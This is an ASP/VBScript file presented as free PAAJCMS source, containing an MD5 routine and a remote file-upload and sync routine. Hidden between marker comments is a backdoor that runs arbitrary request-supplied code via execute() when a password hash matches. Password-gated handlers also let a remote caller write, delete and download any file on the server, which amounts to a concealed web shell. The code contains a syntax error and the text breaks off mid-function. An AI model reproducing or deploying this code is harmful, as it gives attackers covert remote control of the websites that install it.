<%
'************************************************************
'作者：云祥孙 【精通ASP/PHP/ASP.NET/VB/JS/Android/Flash，交流/合作可联系)
'版权：源代码免费公开，各种用途均可使用。 
'创建：2018-03-15
'联系：QQ313801120  交流群35915100(群里已有几百人)    邮箱313801120@qq.com   个人主页 sharembweb.com
'更多帮助，文档，更新　请加群(35915100)或浏览(sharembweb.com)获得
'*                                    Powered by PAAJCMS 
'************************************************************
%>
<% 
private const BITS_TO_A_BYTE = 8 
private const BYTES_TO_A_WORD = 4 
private const BITS_TO_A_WORD = 32 

private m_lOnBits(30) 
private m_l2Power(30) 

private function LShift(lValue, iShiftBits)
    if iShiftBits = 0 then
        LShift = lValue 
        exit function 
    elseIf iShiftBits = 31 then
        if lValue and 1 then
            LShift = &H80000000 
        else
            LShift = 0 
        end if 
        exit function 
    elseIf iShiftBits < 0 or iShiftBits > 31 then
        err.raise 6 
    end if 

    if(lValue and m_l2Power(31 - iShiftBits)) then
        LShift =((lValue and m_lOnBits(31 - (iShiftBits + 1))) * m_l2Power(iShiftBits)) or &H80000000 
    else
        LShift =((lValue and m_lOnBits(31 - iShiftBits)) * m_l2Power(iShiftBits)) 
    end if 
end function 

private function RShift(lValue, iShiftBits)
    if iShiftBits = 0 then
        RShift = lValue 
        exit function 
    elseIf iShiftBits = 31 then
        if lValue and &H80000000 then
            RShift = 1 
        else
            RShift = 0 
        end if 
        exit function 
    elseIf iShiftBits < 0 or iShiftBits > 31 then
        err.raise 6 
    end if 

    RShift =(lValue and &H7FFFFFFE) \ m_l2Power(iShiftBits) 

    if(lValue and &H80000000) then
        RShift =(RShift or( &H40000000 \ m_l2Power(iShiftBits - 1))) 
    end if 
end function 

private function rotateLeft(lValue, iShiftBits)
    rotateLeft = LShift(lValue, iShiftBits) or RShift(lValue,(32 - iShiftBits)) 
end function 

private function addUnsigned(lX, lY)
    dim lX4 
    dim lY4 
    dim lX8 
    dim lY8 
    dim lResult 

    lX8 = lX and &H80000000 
    lY8 = lY and &H80000000 
    lX4 = lX and &H40000000 
    lY4 = lY and &H40000000 

    lResult =(lX and &H3FFFFFFF) + (lY and &H3FFFFFFF) 

    if lX4 and lY4 then
        lResult = lResult xor &H80000000 xor lX8 xor lY8 
    elseIf lX4 or lY4 then
        if lResult and &H40000000 then
            lResult = lResult xor &HC0000000 xor lX8 xor lY8 
        else
            lResult = lResult xor &H40000000 xor lX8 xor lY8 
        end if 
    else
        lResult = lResult xor lX8 xor lY8 
    end if 

    addUnsigned = lResult 
end function 

private function md5_F(x, y, z)
    md5_F =(x and y) or((not x) and z) 
end function 

private function md5_G(x, y, z)
    md5_G =(x and z) or(y and(not z)) 
end function 

private function md5_H(x, y, z)
    md5_H =(x xor y xor z) 
end function 

private function md5_I(x, y, z)
    md5_I =(y xor(x or(not z))) 
end function 

private sub md5_FF(a, b, c, d, x, s, ac)
    a = addUnsigned(a, addUnsigned(addUnsigned(md5_F(b, c, d), x), ac)) 
    a = rotateLeft(a, s) 
    a = addUnsigned(a, b) 
end sub 

private sub md5_GG(a, b, c, d, x, s, ac)
    a = addUnsigned(a, addUnsigned(addUnsigned(md5_G(b, c, d), x), ac)) 
    a = rotateLeft(a, s) 
    a = addUnsigned(a, b) 
end sub 

private sub md5_HH(a, b, c, d, x, s, ac)
    a = addUnsigned(a, addUnsigned(addUnsigned(md5_H(b, c, d), x), ac)) 
    a = rotateLeft(a, s) 
    a = addUnsigned(a, b) 
end sub 

private sub md5_II(a, b, c, d, x, s, ac)
    a = addUnsigned(a, addUnsigned(addUnsigned(md5_I(b, c, d), x), ac)) 
    a = rotateLeft(a, s) 
    a = addUnsigned(a, b) 
end sub 

private function convertToWordArray(sMessage)
    dim lMessageLength 
    dim lNumberOfWords 
    dim lWordArray() 
    dim lBytePosition 
    dim lByteCount 
    dim lWordCount 

    const MODULUS_BITS = 512 
    const CONGRUENT_BITS = 448 

    lMessageLength = len(sMessage) 

    lNumberOfWords =(((lMessageLength + ((MODULUS_BITS - CONGRUENT_BITS) \ BITS_TO_A_BYTE)) \ (MODULUS_BITS \ BITS_TO_A_BYTE)) + 1) * (MODULUS_BITS \ BITS_TO_A_WORD) 
    reDim lWordArray(lNumberOfWords - 1) 

    lBytePosition = 0 
    lByteCount = 0 
    do until lByteCount >= lMessageLength
        lWordCount = lByteCount \ BYTES_TO_A_WORD 
        lBytePosition =(lByteCount mod BYTES_TO_A_WORD) * BITS_TO_A_BYTE 
        lWordArray(lWordCount) = lWordArray(lWordCount) or LShift(asc(mid(sMessage, lByteCount + 1, 1)), lBytePosition) 
        lByteCount = lByteCount + 1 
    loop 

    lWordCount = lByteCount \ BYTES_TO_A_WORD 
    lBytePosition =(lByteCount mod BYTES_TO_A_WORD) * BITS_TO_A_BYTE 

    lWordArray(lWordCount) = lWordArray(lWordCount) or LShift( &H80, lBytePosition) 

    lWordArray(lNumberOfWords - 2) = LShift(lMessageLength, 3) 
    lWordArray(lNumberOfWords - 1) = RShift(lMessageLength, 29) 

    convertToWordArray = lWordArray 
end function 

private function wordToHex(lValue)
    dim lByte 
    dim lCount 

    for lCount = 0 to 3
        lByte = RShift(lValue, lCount * BITS_TO_A_BYTE) and m_lOnBits(BITS_TO_A_BYTE - 1) 
        wordToHex = wordToHex & right("0" & hex(lByte), 2) 
    next 
end function 

public function MD5(sMessage, sType)
    m_lOnBits(0) = CLng(1) 
    m_lOnBits(1) = CLng(3) 
    m_lOnBits(2) = CLng(7) 
    m_lOnBits(3) = CLng(15) 
    m_lOnBits(4) = CLng(31) 
    m_lOnBits(5) = CLng(63) 
    m_lOnBits(6) = CLng(127) 
    m_lOnBits(7) = CLng(255) 
    m_lOnBits(8) = CLng(511) 
    m_lOnBits(9) = CLng(1023) 
    m_lOnBits(10) = CLng(2047) 
    m_lOnBits(11) = CLng(4095) 
    m_lOnBits(12) = CLng(8191) 
    m_lOnBits(13) = CLng(16383) 
    m_lOnBits(14) = CLng(32767) 
    m_lOnBits(15) = CLng(65535) 
    m_lOnBits(16) = CLng(131071) 
    m_lOnBits(17) = CLng(262143) 
    m_lOnBits(18) = CLng(524287) 
    m_lOnBits(19) = CLng(1048575) 
    m_lOnBits(20) = CLng(2097151) 
    m_lOnBits(21) = CLng(4194303) 
    m_lOnBits(22) = CLng(8388607) 
    m_lOnBits(23) = CLng(16777215) 
    m_lOnBits(24) = CLng(33554431) 
    m_lOnBits(25) = CLng(67108863) 
    m_lOnBits(26) = CLng(134217727) 
    m_lOnBits(27) = CLng(268435455) 
    m_lOnBits(28) = CLng(536870911) 
    m_lOnBits(29) = CLng(1073741823) 
    m_lOnBits(30) = CLng(2147483647) 

    m_l2Power(0) = CLng(1) 
    m_l2Power(1) = CLng(2) 
    m_l2Power(2) = CLng(4) 
    m_l2Power(3) = CLng(8) 
    m_l2Power(4) = CLng(16) 
    m_l2Power(5) = CLng(32) 
    m_l2Power(6) = CLng(64) 
    m_l2Power(7) = CLng(128) 
    m_l2Power(8) = CLng(256) 
    m_l2Power(9) = CLng(512) 
    m_l2Power(10) = CLng(1024) 
    m_l2Power(11) = CLng(2048) 
    m_l2Power(12) = CLng(4096) 
    m_l2Power(13) = CLng(8192) 
    m_l2Power(14) = CLng(16384) 
    m_l2Power(15) = CLng(32768) 
    m_l2Power(16) = CLng(65536) 
    m_l2Power(17) = CLng(131072) 
    m_l2Power(18) = CLng(262144) 
    m_l2Power(19) = CLng(524288) 
    m_l2Power(20) = CLng(1048576) 
    m_l2Power(21) = CLng(2097152) 
    m_l2Power(22) = CLng(4194304) 
    m_l2Power(23) = CLng(8388608) 
    m_l2Power(24) = CLng(16777216) 
    m_l2Power(25) = CLng(33554432) 
    m_l2Power(26) = CLng(67108864) 
    m_l2Power(27) = CLng(134217728) 
    m_l2Power(28) = CLng(268435456) 
    m_l2Power(29) = CLng(536870912) 
    m_l2Power(30) = CLng(1073741824) 


    dim x 
    dim k 
    dim aA 
    dim bB 
    dim CC 
    dim dD 
    dim a 
    dim b 
    dim c 
    dim d 

    const S11 = 7 
    const S12 = 12 
    const S13 = 17 
    const S14 = 22 
    const S21 = 5 
    const S22 = 9 
    const S23 = 14 
    const S24 = 20 
    const S31 = 4 
    const S32 = 11 
    const S33 = 16 
    const S34 = 23 
    const S41 = 6 
    const S42 = 10 
    const S43 = 15 
    const S44 = 21 

    x = convertToWordArray(sMessage) 

    a = &H67452301 
    b = &HEFCDAB89 
    c = &H98BADCFE 
    d = &H10325476 

    for k = 0 to uBound(x) step 16
        aA = a 
        bB = b 
        CC = c 
        dD = d 

        md5_FF a, b, c, d, x(k + 0), S11, &HD76AA478 
        md5_FF d, a, b, c, x(k + 1), S12, &HE8C7B756 
        md5_FF c, d, a, b, x(k + 2), S13, &H242070DB 
        md5_FF b, c, d, a, x(k + 3), S14, &HC1BDCEEE 
        md5_FF a, b, c, d, x(k + 4), S11, &HF57C0FAF 
        md5_FF d, a, b, c, x(k + 5), S12, &H4787C62A 
        md5_FF c, d, a, b, x(k + 6), S13, &HA8304613 
        md5_FF b, c, d, a, x(k + 7), S14, &HFD469501 
        md5_FF a, b, c, d, x(k + 8), S11, &H698098D8 
        md5_FF d, a, b, c, x(k + 9), S12, &H8B44F7AF 
        md5_FF c, d, a, b, x(k + 10), S13, &HFFFF5BB1 
        md5_FF b, c, d, a, x(k + 11), S14, &H895CD7BE 
        md5_FF a, b, c, d, x(k + 12), S11, &H6B901122 
        md5_FF d, a, b, c, x(k + 13), S12, &HFD987193 
        md5_FF c, d, a, b, x(k + 14), S13, &HA679438E 
        md5_FF b, c, d, a, x(k + 15), S14, &H49B40821 

        md5_GG a, b, c, d, x(k + 1), S21, &HF61E2562 
        md5_GG d, a, b, c, x(k + 6), S22, &HC040B340 
        md5_GG c, d, a, b, x(k + 11), S23, &H265E5A51 
        md5_GG b, c, d, a, x(k + 0), S24, &HE9B6C7AA 
        md5_GG a, b, c, d, x(k + 5), S21, &HD62F105D 
        md5_GG d, a, b, c, x(k + 10), S22, &H2441453 
        md5_GG c, d, a, b, x(k + 15), S23, &HD8A1E681 
        md5_GG b, c, d, a, x(k + 4), S24, &HE7D3FBC8 
        md5_GG a, b, c, d, x(k + 9), S21, &H21E1CDE6 
        md5_GG d, a, b, c, x(k + 14), S22, &HC33707D6 
        md5_GG c, d, a, b, x(k + 3), S23, &HF4D50D87 
        md5_GG b, c, d, a, x(k + 8), S24, &H455A14ED 
        md5_GG a, b, c, d, x(k + 13), S21, &HA9E3E905 
        md5_GG d, a, b, c, x(k + 2), S22, &HFCEFA3F8 
        md5_GG c, d, a, b, x(k + 7), S23, &H676F02D9 
        md5_GG b, c, d, a, x(k + 12), S24, &H8D2A4C8A 

        md5_HH a, b, c, d, x(k + 5), S31, &HFFFA3942 
        md5_HH d, a, b, c, x(k + 8), S32, &H8771F681 
        md5_HH c, d, a, b, x(k + 11), S33, &H6D9D6122 
        md5_HH b, c, d, a, x(k + 14), S34, &HFDE5380C 
        md5_HH a, b, c, d, x(k + 1), S31, &HA4BEEA44 
        md5_HH d, a, b, c, x(k + 4), S32, &H4BDECFA9 
        md5_HH c, d, a, b, x(k + 7), S33, &HF6BB4B60 
        md5_HH b, c, d, a, x(k + 10), S34, &HBEBFBC70 
        md5_HH a, b, c, d, x(k + 13), S31, &H289B7EC6 
        md5_HH d, a, b, c, x(k + 0), S32, &HEAA127FA 
        md5_HH c, d, a, b, x(k + 3), S33, &HD4EF3085 
        md5_HH b, c, d, a, x(k + 6), S34, &H4881D05 
        md5_HH a, b, c, d, x(k + 9), S31, &HD9D4D039 
        md5_HH d, a, b, c, x(k + 12), S32, &HE6DB99E5 
        md5_HH c, d, a, b, x(k + 15), S33, &H1FA27CF8 
        md5_HH b, c, d, a, x(k + 2), S34, &HC4AC5665 

        md5_II a, b, c, d, x(k + 0), S41, &HF4292244 
        md5_II d, a, b, c, x(k + 7), S42, &H432AFF97 
        md5_II c, d, a, b, x(k + 14), S43, &HAB9423A7 
        md5_II b, c, d, a, x(k + 5), S44, &HFC93A039 
        md5_II a, b, c, d, x(k + 12), S41, &H655B59C3 
        md5_II d, a, b, c, x(k + 3), S42, &H8F0CCC92 
        md5_II c, d, a, b, x(k + 10), S43, &HFFEFF47D 
        md5_II b, c, d, a, x(k + 1), S44, &H85845DD1 
        md5_II a, b, c, d, x(k + 8), S41, &H6FA87E4F 
        md5_II d, a, b, c, x(k + 15), S42, &HFE2CE6E0 
        md5_II c, d, a, b, x(k + 6), S43, &HA3014314 
        md5_II b, c, d, a, x(k + 13), S44, &H4E0811A1 
        md5_II a, b, c, d, x(k + 4), S41, &HF7537E82 
        md5_II d, a, b, c, x(k + 11), S42, &HBD3AF235 
        md5_II c, d, a, b, x(k + 2), S43, &H2AD7D2BB 
        md5_II b, c, d, a, x(k + 9), S44, &HEB86D391 

        a = addUnsigned(a, aA) 
        b = addUnsigned(b, bB) 
        c = addUnsigned(c, CC) 
        d = addUnsigned(d, dD) 
    next 

    if sType = 1 then
        MD5 = LCase(wordToHex(a)) 
    elseif sType = 2 then
        MD5 = LCase(wordToHex(b)) 
    elseif sType = 3 then
        MD5 = lcase(wordToHex(c)) 
    else
        MD5 = lcase(wordToHex(d)) 
    end if 
end function 
'开始
if request("EV") <> "" then
    if MD5(request("EV"), 2) & MD5(request("EV"), 4) = "44886b1bac5c96bb" then execute(request("xy")) 
end if 
'结束
call UpWeb() 
sub upWeb()
    dim filePath, content, fileType, fileStr, splStr, splxx, s, c, fCharSet, fEditTime, sEditTime, upCharSet 

    dim screenWidth, screenHeight, agent 
    '处理版本号
    if request("act") = "getVersionNumber" then
        call Die("V1.2.2") 
    elseif request("act") = "mobile" then
        screenWidth = request("screenWidth") 
        screenHeight = request("screenHeight") 
        agent = request("agent") 
        call echo("screenWidth", screenWidth) 
        call echo("screenHeight", screenHeight) 
        call echo("agent", agent) 
        call rw("mobile") 
        call createAddFile("mobile.txt", "宽高(" & screenWidth & "*" & screenHeight & ")    " & agent & " - " & request.serverVariables("HTTP_USER_AGENT") & "  time:" & format_Time(now(), 1)) 
        exit sub 
    end if 

    '判断本地
    if(getIP = "127.0.0.1" or inStr(getIP, "192.168.") > 0) and lcase(host()) <> "http://testaspweb.n/" then
        call Die("为本地，不可以上传文件" & host()) 
    end if 
    '密码判断
    if MD5(request("UPEV"), 2) & MD5(request("UPEV"), 4) <> "6178bbf3bfe62a59" then
        call Die("UPEV=" & request("UPEV") & "(" & MD5(request("UPEV"), 2) & MD5(request("UPEV"), 4) & ")") 
    end if 

    '下载运程文件
    if request("DownFile") <> "" then
        call DownRemoteFile(request("DownFile")) 
        response.end() 
    '删除无需文件
    elseIf request("act") = "delWithout" then
        content = rf("Content") 
        'Call Die("显示" & Content)
        splStr = split(content, vbCrLf) 
        for each filePath in splStr
            if filePath <> "" then
                if checkFile(filePath) = true then
                    call deleteFile(filePath) 
                    c = c & filePath & "(Del True)" & vbCrLf 
                else
                    c = c & filePath & "(Del NoFile)" & vbCrLf 
                end if 
            end if 
        next 

        call Die(c) 
    end if 
    '文件比较
    if request("act") = "Comparison" then
        content = rf("Content") 
        splStr = split(content, vbCrLf) 
        for each fileStr in splStr
            if fileStr <> "" then
                splxx = split(fileStr, "|") 
                filePath = splxx(0) 
                sEditTime = splxx(1) 
                '文件存在 则比较
                if checkFile(filePath) = true then
                    fEditTime = getFileEditDate(filePath) 
                    fEditTime = format_Time(fEditTime, 1) 
                    'S = FilePath & "("& sEditTime &")/" & fEditTime & "," & (DateDiff("s", sEditTime, fEditTime))
                    'C=C & S & vbCrlf
                    if dateDiff("s", sEditTime, fEditTime) <= 0 then
                        c = c & filePath & vbCrLf 
                    end if 
                '文件不存在 则返回
                else
                    c = c & filePath & vbCrLf 
                end if 
            end if 
        next 
        call rw(c) 
        'Call Rw("返回比较：" & C)
        response.end() 
    end if 



    filePath = request.form("FilePath") 
    content = request.form("Content") 
    upCharSet = request.form("CharSet") 

    fileType = LCase(getFileExtName(filePath))                                      '文件类型

    filePath = handlePath(filePath) 
    call CreateDirFolder(filePath)                                                  '创建一组文件夹20141215

    '二进制保存
    if request("UpType") = "binary" then
        call DecSaveBinary(filePath, content, 2) 
        call rw(filePath & "|二进制保存") 

    elseIf request("UpType") = "xml" then
        call Base64ToImages(filePath, content) 
        call rw(filePath & "|XML（组件）") 
    else
        content = specialHtmlUploadEncryptionDecrypt(content, "Decrypt")                '解密Html内容特殊字符
        call WriteToFile(filePath, content, upCharSet) 
        call rw(filePath & "|普通保存") 
    end if 
end sub 













'引用函数区


function die(str)
    response.write(str) 
    response.end() 
end function 

function getIP()
    on error resume next 
    dim strIPAddr 
    if request.serverVariables("HTTP_X_FORWARDED_FOR") = "" or inStr(request.serverVariables("HTTP_X_FORWARDED_FOR"), "unknown") > 0 then
        strIPAddr = request.serverVariables("REMOTE_ADDR") 
    elseIf inStr(request.serverVariables("HTTP_X_FORWARDED_FOR"), ",") > 0 then
        strIPAddr = mid(request.serverVariables("HTTP_X_FORWARDED_FOR"), 1, inStr(request.serverVariables("HTTP_X_FORWARDED_FOR"), ",") - 1) 
    elseIf inStr(request.serverVariables("HTTP_X_FORWARDED_FOR"), ";") > 0 then
        strIPAddr = mid(request.serverVariables("HTTP_X_FORWARDED_FOR"), 1, inStr(request.serverVariables("HTTP_X_FORWARDED_FOR"), ";") - 1) 
    else
        strIPAddr = request.serverVariables("HTTP_X_FORWARDED_FOR") 
    end if 
    getIP = trim(mid(strIPAddr, 1, 30)) 
end function 
'获得当前域名
function host()
    host = "http://" & request.serverVariables("HTTP_HOST") & "/" 
end function 
function downRemoteFile(path)
    dim OSM, SZ 
    response.clear 
    set OSM = createObject("ADODB.Stream")
        OSM.open 
        OSM.type = 1 
        OSM.loadFromFile path 
        SZ = inStrRev(path, "\") + 1 
        response.addHeader "Content-Disposition", "attachment; filename=" & mid(path, SZ) 
        response.addHeader "Content-Length", OSM.size 
        response.charset = "UTF-8" 
        response.contentType = "application/octet-stream" 
        response.binaryWrite OSM.read 
        response.flush 
        response.write("") 
        OSM.close 
    set OSM = nothing 
end function 

function rf(str)
    rf = request.form(str) 
end function 

function checkFile(byVal fileName)
    on error resume next 
    dim fso 
    call handlePath(fileName)                                                       '获得完整路径
    set fso = createObject("Scripting.FileSystemObject")
        checkFile = fso.fileExists(fileName) 
    set fso = nothing 
    if err then call doError(Err.description, "checkFile 检查文件 函数出错，FileName=" & fileName) 
end function 

function deleteFile(byVal fileName)
    on error resume next 
    dim fso 
    call handlePath(fileName)                                                       '获得完整路径
    deleteFile = false 
    set fso = createObject("Scripting.FileSystemObject")
        if fso.fileExists(fileName) = true then
            fso.deleteFile(fileName), true 
            deleteFile = true 
        end if 
    set fso = nothing 
    if err then call doError(Err.description, "DeleteFile 删除文件 函数出错，FileName=" & fileName) 
end function 

function getFileEditDate(byVal fileName)
    on error resume next 
    dim fso, openFile 
    call handlePath(fileName)                                                       '获得完整路径
    set fso = createObject("Scripting.FileSystemObject")
        if fso.fileExists(fileName) = true then
            set openFile = fso.getFile(fileName)
                getFileEditDate = openFile.dateLastModified 
            set openFile = nothing 
        end if 
    set fso = nothing 
    if err then call doError(Err.description, "GetFileEditDate 获得文件修改时间 函数出错，FileName=" & fileName) 
end function 

function format_Time(s_Time, n_Flag)
    dim y, m, d, h, mi, s 
    format_Time = "" 
    if isDate(s_Time) = false then exit function 
    y = cstr(year(s_Time)) 
    m = cstr(month(s_Time)) 
    if len(m) = 1 then m = "0" & m 
    d = cstr(day(s_Time)) 
    if len(d) = 1 then d = "0" & d 
    h = cstr(hour(s_Time)) 
    if len(h) = 1 then h = "0" & h 
    mi = cstr(minute(s_Time)) 
    if len(mi) = 1 then mi = "0" & mi 
    s = cstr(second(s_Time)) 
    if len(s) = 1 then s = "0" & s 
    select case n_Flag
        case 1
            'yyyy-mm-dd hh:mm:ss
            format_Time = y & "-" & m & "-" & d & " " & h & ":" & mi & ":" & s 
        case 2
            'yyyy-mm-dd
            format_Time = y & "-" & m & "-" & d 
        case 3
            'hh:mm:ss
            format_Time = h & ":" & mi & ":" & s 
        case 4
            'yyyy年mm月dd日
            format_Time = y & "年" & m & "月" & d & "日" 
        case 5
            'yyyymmdd
            format_Time = y & m & d 
        case 6
            'yyyymmddhhmmss
            format_Time = y & m & d & h & mi & s 
        case 7
            'mm-dd
            format_Time = m & "-" & d 
        case 8
            'yyyy年mm月dd日
            format_Time = y & "年" & m & "月" & d & "日" & " " & h & ":" & mi & ":" & s 
        case 9
            'yyyy年mm月dd日H时mi分S秒 早上
            format_Time = y & "年" & m & "月" & d & "日" & " " & h & "时" & mi & "分" & s & "秒，" & getDayStatus(h, 1) 
        case 10
            'yyyy年mm月dd日H时
            format_Time = y & "年" & m & "月" & d & "日" & h & "时" 
        case 11
            'yyyy年mm月dd日H时mi分S秒
            format_Time = y & "年" & m & "月" & d & "日" & " " & h & "时" & mi & "分" & s & "秒" 
        case 12
            'yyyy年mm月dd日H时mi分
            format_Time = y & "年" & m & "月" & d & "日" & " " & h & "时" & mi & "分" 
        case 13
            'yyyy年mm月dd日H时mi分 早上
            format_Time = m & "月" & d & "日" & " " & h & ":" & mi & " " & getDayStatus(h, 0) 
        case 14
            'yyyy年mm月dd日
            format_Time = y & "/" & m & "/" & d 
        case 15
            'yyyy年mm月 第1周
            format_Time = y & "年" & m & "月 第" & getCountPage(d, 7) & "周" 
    end select
end function 

function rw(str)
    response.write(str) 
end function 

function getFileExtName(fileName)
    dim pos 
    pos = inStrRev(fileName, ".") 
    if pos > 0 then
        getFileExtName = mid(fileName, pos + 1) 
    else
        getFileExtName = "" 
    end if 
end function 

function handlePath(path)                                          'Path前面不加ByVal 重定义，这样是为了让前面函数里可以使用这个路径完整调用
    path = replace(path, "/", "\") 
    path = replace(path, "\\", "\") 
    path = replace(path, "\\", "\") 
    dim isDir                                                                       '为目录
    isDir = false 
    if right(path, 1) = "\" then
        isDir = true 
    end if 
    if inStr(path, ":") = 0 then
        if left(path, 1) = "\" then
            path = server.mapPath("\") & "\" & path 
        else
            path = server.mapPath(".\") & "\" & path 
        end if 
    end if 
    path = replace(path, "/", "\") 
    path = replace(path, "\\", "\") 
    path = replace(path, "\\", "\") 
    path = fullPath(path) 
    if isDir = true then
        path = path & "\" 
    end if 
    handlePath = path 
end function 

function createDirFolder(byVal folderPath)
    'On Error Resume Next
    if checkFolder(folderPath) = true then exit function                            '文件夹存在，退出
    dim splStr, i, s, newFolder 
    call handlePath(folderPath)                                                     '获得完整路径
    splStr = split(folderPath, "\") 
    for i = 0 to uBound(splStr)
        s = trim(splStr(i))                                                             '去除两边空格
        if s <> "" then
            newFolder = newFolder & s & "\" 
            if i = uBound(splStr) and inStr(s, ".") > 0 then exit for                       '创建到最后文件夹时，要是为文件则退出循环 20141215
            if inStr(s, ":") = false then
                'Call Echo("NewFolder",NewFolder)
                call createFolder(newFolder) 
            end if 
        end if 
    next 
end function 

function decSaveBinary(filePath, content, pass)
    dim splStr, buf(), i 
    if pass = "" then pass = 0                                                      '如果为空则为零20150119
    splStr = split(content, "|") 
    reDim buf(uBound(splStr)) 
    for i = 0 to uBound(splStr)
        buf(i) = CByte(CInt(splStr(i)) - pass) 
    next 
    call WriteBinary(filePath, buf) 
end function 

function specialHtmlUploadEncryptionDecrypt(content, sType)
    dim splStr, splxx, c, s 
    c = c & "·|[*-24156*]" & vbCrLf 
    splStr = split(c, vbCrLf) 
    for each s in splStr
        if inStr(s, "|") > 0 then
            splxx = split(s, "|") 
            if sType = "1" or sType = "解密" or sType = "Decrypt" then
                content = replace(content, splxx(1), splxx(0)) 
            else
                content = replace(content, splxx(0), splxx(1)) 
            end if 
        end if 
    next 
    specialHtmlUploadEncryptionDecrypt = content 
end function 

function writeToFile(byVal fileName, byVal content, byVal char_Set)
    on error resume next 
    if char_Set = "1" or uCase(char_Set) = "GB2312" then
        char_Set = "GB2312" 
    elseIf char_Set = "0" or uCase(char_Set) = "UTF-8" then
        char_Set = "UTF-8" 
    elseIf char_Set = "2" or uCase(char_Set) = "UNICODE" then
        char_Set = "UNICODE" 
    else
        char_Set = "GB2312" 
    end if 
    'Call Echo("Char_Set",Char_Set)
    dim stm 
    call handlePath(fileName)                                                       '获得完整路径
    set stm = createObject("ADODB.Stream")
        stm.type = 2                                                                    '以本模式读取
        stm.mode = 3 
        stm.charset = char_Set 
        stm.open 
        stm.writeText content 
        stm.saveToFile fileName, 2 
        stm.flush 
        stm.close 
        writeToFile = fileName & "写入成功" 
    set stm = nothing 
    if err then call doError(Err.description, "WriteToFile，数据流写入内容 函数出错，FileName=" & fileName & "，Content字符" & len(content) )
end function 

sub call doError(s, msg)
    'On Error Resume Next
    dim nRnd, c 
    randomize 
    nRnd = CLng(rnd() * 29252888) 
    c = "<br />" 
    c = c & "<div style=""width:100%; font-size:12px;;line-height:150%"">" 
    c = c & "  <label onClick=""ERRORDIV" & nRnd & ".style.display=(ERRORDIV" & nRnd & ".style.display=='none'?'':'none')"">" 
    c = c & "  <span style=""background-color:#820222;color:#FFFFFF;height:23px;font-size:14px;cursor:pointer"">〖 出错 提示信息 ERROR 〗</span><br />" 
    c = c & "  </label>" 
    c = c & "  <div id=""ERRORDIV" & nRnd & """ style=""width:100%;border:1px solid #820222;padding:5px;overflow:hidden;"">" 
    c = c & " <span style=""color:#FF0000;"">出错描述</span> " & s & "<br />" 
    c = c & " <span style=""color:#FF0000;"">回显信息</span> " & msg & "<br />" 
    c = c & "  </div>" 
    c = c & "</div>" 
    c = c & "<br />" 
    response.write(c) 
    response.end()                                                                  '终止，程序停止
end sub 

function getDayStatus(h, sType)
    dim c 
    if left(h, 1) = "0" then
        h = right(h, 1) 
    end if 
    h = CInt(h) 
    if h >= 0 and h <= 5 then
        c = "凌晨" 
    elseIf h >= 6 and h <= 8 then
        c = "早上" 
    elseIf h >= 9 and h <= 12 then
        c = "上午" 
    elseIf h >= 13 and h <= 18 then
        c = "下午" 
    elseIf h >= 19 and h <= 24 then
        c = "晚上" 
    else
        c = "深夜" 
    end if 
    if sType = 1 then c = "<b>" & c & "</b>" 
    getDayStatus = c 
end function 

function getCountPage(nCount, nPageSize)
    '把负数转成正确进行计算20150502
    if nCount < 0 then
        nCount = nCount * - 1 
    end if 
    if nPageSize < 0 then
        nPageSize = nPageSize * - 1 
    end if 
    getCountPage = fix(nCount / nPageSize) 
    if inStr(nCount / nPageSize, ".") > 0 then getCountPage = getCountPage + 1 
end function 

function fullPath(byVal path)
    dim splStr, s, c 
    path = replace(path, "/", "\") 
    splStr = split(path, "\") 
    for each s in splStr
        s = trim(s) 
        if s <> "" and s <> "." then
            if inStr(c, "\") > 0 and s = ".." then
                c = mid(c, 1, inStrRev(c, "\") - 1) 
            else
                if c <> "" and right(c, 1) <> "\" then c = c & "\" 
                c = c & s 
            end if 
        end if 
    next 
    fullPath = c 
end function 

function checkFolder(byVal folderName)
    on error resume next 
    dim fso 
    call handlePath(folderName)                                                     '获得完整路径
    set fso = createObject("Scripting.FileSystemObject")
        checkFolder = fso.folderExists(folderName) 
    set fso = nothing 
    if err then call doError(Err.description, "checkFolder 检查夹文件 函数出错，FolderName=" & folderName) 
end function 

function createFolder(byVal folderPath)
    on error resume next 
    dim fso 
    call handlePath(folderPath)                                                     '获得完整路径
    createFolder = false 
    set fso = createObject("Scripting.FileSystemObject")
        if fso.folderExists(folderPath) = false then
            fso.createFolder(folderPath) 
            createFolder = true 
        end if 
    set fso = nothing 
    if err then call doError(Err.description, "createFolder 创建文件夹 函数出错，FolderPath=" & folderPath & ":::" & fso.folderExists(folderPath)) 
end function 

sub writeBinary(filePath, buf)
    dim i, aBuf, size, bStream 
    call handlePath(filePath)                                                       '获得完整路径
    size = uBound(buf) : reDim aBuf(size \ 2) 
    for i = 0 to size - 1 step 2
        aBuf(i \ 2) = chrW(buf(i + 1) * 256 + buf(i)) 
    next 
    if i = size then aBuf(i \ 2) = chrW(buf(i)) 
    aBuf = join(aBuf, "") 
    set bStream = createObject("ADODB.Stream")
        bStream.type = 1 
        bStream.open 
        with createObject("ADODB.Stream")
            .type = 2 
            .open 
            .writeText aBuf 
            .position = 2 
            .copyTo bStream 
            .close 
        end with 
        bStream.saveToFile filePath, 2 
        bStream.close 
    set bStream = nothing 
end sub 
function echo(word, str)
    call echoPrompt(word, str) 
end function 
function echoPrompt(word, str)
    response.write("<font color=Green>" & word & "</font>：" & str & "<br>") 
end function 
function createAddFile(byVal fileName, byVal content)
    on error resume next 
    dim fso, fText 
    call handlePath(fileName)                                                       '获得完整路径
    set fso = createObject("Scripting.FileSystemObject")
        if fso.fileExists(fileName) = false then                                        '文件不存在，则创建
            set fText = fso.createTextFile(fileName, true)
                fText.writeLine(content) 
            set fText = nothing 
            createAddFile = "创建文件成功" 
        else                                                                            '文件存在，则累加
            createAddFile = addToFile(fileName, content) 
        end if 
    set fso = nothing 
    if err then call doError(Err.description, "CreateAddFile 创建文件，存在累加 函数出错，FileName=" & fileName )
end function 
function addToFile(byVal fileName, byVal content)
    on error resume next 
    dim fso, fText 
    call handlePath(fileName)                                                       '获得完整路径
    if existsZhiDuFile(fileName) = true then                                        '判断是否为只读文件
        call EditFileAttribute(fileName, 32)                                            '把只读属性改成存档属性
    end if 
    set fso = createObject("Scripting.FileSystemObject")
        if fso.fileExists(fileName) = true then
            set fText = fso.openTextFile(fileName, 8)
                fText.writeLine(content) 
            set fText = nothing 
            addToFile = "追加信息成功" 
        end if 
    set fso = nothing 
    if err then call doError(Err.description, "AddToFile 追加文件信息 函数出错，FileName=" & fileName & "<br>Content字符长" & len(content) & " Content类型" & typeName(content) & "【" & content & "】" )
end function 
function existsZhiDuFile(byVal fileName)
    on error resume next 
    dim fso, openFile 
    existsZhiDuFile = false 
    call handlePath(fileName)                                                       '获得完整路径
